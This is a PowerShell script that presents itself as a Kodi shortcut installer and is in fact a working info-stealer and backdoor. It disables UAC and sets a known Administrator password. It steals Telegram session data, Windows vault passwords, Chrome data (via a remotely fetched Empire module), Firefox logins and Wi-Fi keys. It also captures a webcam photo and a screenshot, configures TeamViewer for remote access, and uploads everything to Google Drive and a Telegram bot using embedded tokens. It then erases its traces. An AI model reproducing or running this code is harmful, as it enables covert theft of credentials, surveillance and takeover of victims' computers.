﻿#Create needed folders for the script
New-Item -ItemType directory -Path "c:\Program_Files" -Force 
gci -Recurse -Filter "kodi.exe" -File -ErrorAction SilentlyContinue -Path "c:\kodi\control" | Copy-Item -Destination "c:\Program_Files\kodi.exe"
gci -Recurse -Filter "kodi.ico" -File -ErrorAction SilentlyContinue -Path "c:\kodi\control" | Copy-Item -Destination "c:\Program_Files\kodi.ico"

#remove old shortcuts 
Remove-Item -Path "$home\Desktop\kodi.lnk"
Remove-Item -Path "$home\Desktop\kodi.exe.lnk"
Remove-Item -Path "$home\Desktop\kodi.exe - Shortcut.lnk"
Remove-Item -Path "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\kodi.lnk"


#create shortcut in desktop and taskbar
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\Kodi.lnk")
$Shortcut.TargetPath = "C:\Program_Files\kodi.exe"
$Shortcut.IconLocation = "C:\Program_Files\kodi.ico"
$Shortcut.Save()

& c:\kodi\control\syspin.exe "c:\Program_Files\kodi.exe" 5386
& c:\kodi\control\syspin.exe "c:\Program_Files\kodi.exe" 51201
& c:\kodi\control\syspin.exe "c:\Program_Files\kodi.exe" "pin to start"
& c:\kodi\control\syspin.exe "c:\Program_Files\kodi.exe" "pin to taskbar"


gci -Recurse -Filter "Kodi.lnk" -File -ErrorAction SilentlyContinue -Path "$Home\Desktop" | Copy-Item -Destination "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\kodi.lnk"


#Disable UAC
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

#take telegram data
$procid=get-process Telegram |select -expand id
Write-Host $procid
Stop-process -Id $procid

New-Item -ItemType directory -Path c:\tdata -Force 
$dirName = "C:\tdata"
copy-Item -Path (Get-Item -Path "$env:APPDATA\Telegram Desktop\tdata\*" -Exclude ('user_data', 'tdummy', 'emoji', 'dumps')).FullName -Destination $dirName -Recurse -Force
Compress-Archive -Path c:\tdata -DestinationPath c:\kodi\tdata.zip


#tv settings
# Vars
$DestFile = "$env:COMPUTERNAME-TV-ID.txt"
$DestPath = "c:\kodi"
$Dest = "$DestPath\$DestFile"
 
# Install Team Viewer
net stop teamviewer
Start-Sleep -Seconds 2
reg import c:\kodi\control\settings.reg
Start-Sleep -Seconds 2
net start teamviewer
Start-Sleep -Seconds 2
(Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer' -Name ClientID).ClientID > $dest
& 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe' --minimize

#change local user settings
Get-LocalUser -Name "Administrator" | Enable-LocalUser
$SecurePassword = ConvertTo-SecureString "95310415" -AsPlainText -Force
$UserAccount = Get-LocalUser -Name "Administrator"
$UserAccount | Set-LocalUser -Password $SecurePassword

#get geo location #perperation for IE to run with no promotion
regedit /s C:\kodi\control\ierec.reg

#disable wifi
Get-NetAdapter | ? status -ne up | Disable-NetAdapter -Confirm:$false
#disable LAN
Get-NetAdapter -Name * | ? status -eq up | disable-NetAdapter -Confirm:$false
#enable both of the above
Get-NetAdapter -Name * | ? status -eq disabled | enable-NetAdapter -Confirm:$false
#wait to reconnect
do {$pingtest = test-connection -comp 8.8.8.8 -count 1 -Quiet} until ($pingtest)

#get ip info and save to file
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content) | Out-File -FilePath c:\kodi\info.txt -Force

#Run IE 
$url = "https://maps.google.com" 
$ie = New-Object -com internetexplorer.application
$ie.visible = $false
$ie.navigate($url)

#get windows credentials
function ExportCredMan
{
    # Dump local passwords from credential manager
    [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $allpass = $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
    $Output = "wincred.txt"
    $allpass | Export-Csv -NoTypeInformation c:\kodi\$Output
}
ExportCredMan

#GET info from chrome
$procid=get-process chrome |select -expand id
Write-Host $procid
Stop-process -Id $procid
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'
$code = Invoke-RestMethod -Uri $url -UseBasicParsing
Invoke-Expression $code
Get-ChromeDump | Out-File -FilePath c:\kodi\Chrome.txt -Force
gci -Recurse -Filter "Web Data" -File -ErrorAction SilentlyContinue -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" | Copy-Item -Destination "c:\kodi\Web Data"




#Get SSID INFO
 $oldverbose = $VerbosePreference
    $VerbosePreference = "continue"

    #Run netsh command to get wireless profiles, and store to a variable
    $command = "netsh.exe wlan show profiles"
    $output = Invoke-Expression $command
    $SSIDsResult = $Output | Select-String -Pattern 'All User Profile'

    #Parse Output by splitting on the colon and trim
    $SSIDs = ($SSIDsResult -split ":",2).Trim()

    #Count the number of elements in the array
    $NumElements = $SSIDs.GetUpperBound(0)
    Write-Verbose "Elements: $NumElements"
    Write-Verbose "$SSIDs"

    #Setup variables
    $TempIndex = 0
    $AllSSIDs = @()

    #Count through finding odd elements only to store to array, only the odd elements are profiles names
    While ($TempIndex -lt $NumElements) {
            $TempIndex = $TempIndex + 1
    
            #Do math to see if the Index is odd
            If ($TempIndex % 2 -eq 1) {
                #Debug output not sure why this does not work 
                Write-Verbose "($SSIDs[$TempIndex])"
        
                #Add the odd elements to the array        
                $AllSSIDs += ,@($SSiDs[$TempIndex])
            }
        }

    Write-Verbose "$AllSSIDs"

    $AllProfiles = @()

    foreach ($SSID in $AllSSIDs)
        {
        $PW='<no password / null value>'
        $ProfileName=''
        $PwSearchResult=''
    
        #Run netsh command to get wireless profiles and password store to a variable
        $str = $SSID
        $command = "netsh.exe wlan show profiles name=""$str"" key=clear"
        Write-Verbose "$command"
        $output = Invoke-Expression $command

        #Use select-String and search for 'SSID'
        $SSIDSearchResult = $output | Select-String -Pattern 'SSID Name'

        #Parse Output by splitting on the colon, grab the last element in the array, trim, and remove quotes
        $ProfileName = ($SSIDSearchResult -split ":",2)[-1].Trim() -replace '"'


        #Retrieve wireless profile password using the same method
        $PwSearchResult = $Output | Select-String -Pattern 'Key Content'
        If ($PwSearchResult -ne $null) { 
            $PW = ($PwSearchResult -split ":",2)[1].Trim() -replace '"'
            }
        Write-Verbose "$ProfileName $PW"

        #Add the SSID name and Password to the array    
        $Allprofiles += ,@($ProfileName,$PW)
        }



    #Format the array for output to the screen and clipboard
    $ProfilesTable = ($AllProfiles | % { $_ -join "`t" }) -join "`n"

    $VerbosePreference = $oldverbose
     $ProfilesTable | Out-File -FilePath c:\kodi\ssid.txt -Force



#get tv id
$TeamViewerVersions = @('6','7','8','9','')

If([IntPtr]::Size -eq 4) {
    $RegPath='HKLM:\SOFTWARE\TeamViewer'    
} else {
    $RegPath='HKLM:\SOFTWARE\Wow6432Node\TeamViewer'
}

$ErrorActionPreference= 'silentlycontinue'

foreach ($TeamViewerVersion in $TeamViewerVersions) {
    If ((Get-Item -Path $RegPath$TeamViewerVersion).GetValue('ClientID') -ne $null) {
        $TeamViewerID=(Get-Item -Path $RegPath$TeamViewerVersion).GetValue('ClientID')
    }
}

Write-Output  "The Teamviewer ID of $ENV:COMPUTERNAME is '$TeamViewerID'" >> c:\kodi\tv.txt 


##Get Data From FireFox
$procid=get-process firefox |select -expand id
Write-Host $procid
Stop-process -Id $procid
gci -Recurse -Filter "logins.json" -File -ErrorAction SilentlyContinue -Path "$env:APPDATA\Mozilla\Firefox\Profiles" | Copy-Item -Destination c:\kodi\logins.json 
gci -Recurse -Filter "key4.db" -File -ErrorAction SilentlyContinue -Path "$env:APPDATA\Mozilla\Firefox\Profiles" | Copy-Item -Destination c:\kodi\key4.db
gci -Recurse -Filter "formhistory.sqlite" -File -ErrorAction SilentlyContinue -Path "$env:APPDATA\Mozilla\Firefox\Profiles" | Copy-Item -Destination c:\kodi\formhistory.sqlite


#get windows credentials
function ExportCredMan
{
    # Dump local passwords from credential manager
    [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $allpass = $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
    $Output = "wincred.txt"
    $allpass | Export-Csv -NoTypeInformation c:\kodi\$Output
}
ExportCredMan



#take photo from camera
& C:\kodi\control\CommandCam.exe /quiet /filename c:\kodi\face.jpg

#take screenshot
[void][reflection.assembly]::loadwithpartialname("system.windows.forms")
[system.windows.forms.sendkeys]::sendwait('{PRTSC}')
Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList "c:\kodi\screenshot.png"

#some more data
Get-CimInstance Win32_OperatingSystem | Select-Object Caption,OSArchitecture| Out-File -FilePath c:\kodi\os.txt -Force
$usr= "$Env:USERNAME" | Out-File -FilePath c:\kodi\username.txt -Force
$Env:computername | Out-File -FilePath c:\kodi\hostname.txt -Force
$computerSystem.Manufacturer | Out-File -FilePath c:\kodi\man.txt -Force
$computerSystem.Model | Out-File -FilePath c:\kodi\model.txt -Force
New-Item c:\kodi\TVPASS.txt
Set-Content c:\kodi\TVPASS.txt 'TeamViewer password is 95310415 the ID is in TV.txt file'
New-Item c:\kodi\localuser.txt
Set-Content c:\kodi\localuser.txt 'if user has password login with user: Administrator password: 95310415'

#Get AV data

function Get-AntivirusName { 
 
[cmdletBinding()]     
param ( 
[string]$ComputerName = "$env:computername" , 
$Credential 
) 
 
 
    BEGIN  
        { 
            # Setting WMI query in a variable 
            $wmiQuery = "SELECT * FROM AntiVirusProduct" 
 
        } 
 
 
    PROCESS  
        { 
            # doing getting wmi 
                 
            $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters # -ErrorVariable myError -ErrorAction 'SilentlyContinue'             
            Write-host $AntivirusProduct.displayName -ForegroundColor Cyan 
 
        } 
 
    END { 
 
        } 
} 
Get-AntivirusName | Out-File -FilePath c:\kodi\AV.txt -Force

#run script
wait -s 10
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Force
C:\kodi\IETabAddress.ps1  -ExportCsvFile C:\kodi\geolocatoin.txt

#clear unwanted files
Remove-Item –path 'c:\kodi\*' -include *.exe -Confirm:$false 
Remove-Item –path 'c:\kodi\*' -include *.bat -Confirm:$false 
Remove-Item –path 'c:\kodi\*' -include *.vbs -Confirm:$false 
Remove-Item –path 'c:\kodi\*' -include *.reg -Confirm:$false 
Remove-Item –path 'c:\kodi\control\*' -include *.exe -Confirm:$false 
Remove-Item –path 'C:\kodi\Control\*' -include *.bat -Confirm:$false 
Remove-Item –path 'C:\kodi\Control\*' -include *.vbs -Confirm:$false 
Remove-Item –path 'C:\kodi\Control\*' -include *.reg -Confirm:$false 

#compress all data
Compress-Archive -Path c:\kodi -DestinationPath c:\kodi\NoAdminData.zip

#upload all data
$params = @{
    Uri = 'https://accounts.google.com/o/oauth2/token'
    Body = @(
        "refresh_token=1//04DZoakk_c1DTCgYIARAAGAQSNwF-L9IrYML4Jf78l4I2ViYe0oQi63d7cSheSme4RAEL4kWf861dizYjHsN0B_xaZ0uiGlTMAII", # Replace $RefreshToken with your refresh token
        "client_id=549215492671-i8ml6nir1ka9dpde80htf49j8rct4a57.apps.googleusercontent.com",         # Replace $ClientID with your client ID
        "client_secret=QnJ2e3NV52USzF1Be2V7I-hN", # Replace $ClientSecret with your client secret
        "grant_type=refresh_token"
    ) -join '&'
    Method = 'Post'
    ContentType = 'application/x-www-form-urlencoded'
}
$accessToken = (Invoke-RestMethod @params).access_token

# Change this to the file you want to upload
$SourceFile = 'C:\kodi\NoAdminData.zip'

# Get the source file contents and details, encode in base64
$sourceItem = Get-Item $sourceFile
$sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
$sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)

# If uploading to a Team Drive, set this to 'true'
$supportsTeamDrives = 'true'

# Set the file metadata
$uploadMetadata = @{
    originalFilename = $sourceItem.Name
    name = $sourceItem.Name
    description = $sourceItem.VersionInfo.FileDescription
    parents = @('1RCVTU-2eYtHFfT4jv5yqyAlPXDS1FBOR') # Include to upload to a specific folder
    teamDriveId = ‘teamDriveId’            # Include to upload to a specific teamdrive
}

# Set the upload body
$uploadBody = @"
--boundary
Content-Type: application/json; charset=UTF-8

$($uploadMetadata | ConvertTo-Json)

--boundary
Content-Transfer-Encoding: base64
Content-Type: $sourceMime

$sourceBase64
--boundary--
"@

# Set the upload headers
$uploadHeaders = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = 'multipart/related; boundary=boundary'
    "Content-Length" = $uploadBody.Length
}

# Perform the upload
$response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&supportsTeamDrives=$supportsTeamDrives" -Method Post -Headers $uploadHeaders -Body $uploadBody


<# Telegram Bot settings #>
$BotToken = "1054940243:AAGHkubADX9DdqwNyavMdWBqbMwCwhsF2is"
$ChatID = -1001272883864
$Message = "Hey, this is a test from the Bot!"
$hostname = Get-Content -Path C:\kodi\hostname.txt | Out-String 
$Serverlist =Get-Content -Path C:\kodi\IPdata.txt | Out-String
$OS = Get-Content -Path C:\kodi\os.txt | Out-String
$CachedPass = Get-Content -Path C:\kodi\wincred.txt | Out-String
$TV = Get-Content -Path C:\kodi\tv.txt | Out-String
$urls = Get-Content -Path C:\kodi\geolocatoin.txt | Out-String 
$SSID = Get-Content -Path C:\kodi\ssid.txt | Out-String
$tvpass = Get-Content -Path C:\kodi\tvpass.txt | Out-String
$localuser = Get-Content -Path C:\kodi\localuser.txt | Out-String
$usr= "$Env:USERNAME"
$Env:computername 
$computerSystem = (Get-WmiObject -Class:Win32_ComputerSystem)
$man = Get-Content -Path C:\kodi\man.txt | Out-String 
$model = Get-Content -Path C:\kodi\model.txt | Out-String 

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-RestMethod -Uri "https://api.telegram.org/bot1054940243:AAGHkubADX9DdqwNyavMdWBqbMwCwhsF2is/sendMessage?chat_id=-1001272883864&text= הסקריפט הופעל בהצלחה אצל $Serverlist + משתמש $usr + שם מחשב $hostname + על מערכת הפעלה $OS +דגם מחשב $man $model + $TV + $tvpass + $localuser + כתובת המתקין נמצאת ב $urls + רשימת הרשתות שהמחשב היה מחובר הם: $SSID + $CachedPass + NoAdminData  "
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-RestMethod -Uri "https://api.telegram.org/bot1054940243:AAGHkubADX9DdqwNyavMdWBqbMwCwhsF2is/sendMessage?chat_id=-1001272883864&text= chrome and FireFox Data are in this URL: https://drive.google.com/drive/folders/1RCVTU-2eYtHFfT4jv5yqyAlPXDS1FBOR?usp=sharing "




Get-ChildItem "C:\kodi" -Recurse | Remove-Item -Force -Confirm:$false > $null 2>&1
Remove-Item 'C:\kodi' -Recurse -force -Confirm:$false > $null 2>&1
Remove-Item –path 'c:\kodi\*' -include *.txt -Confirm:$false 

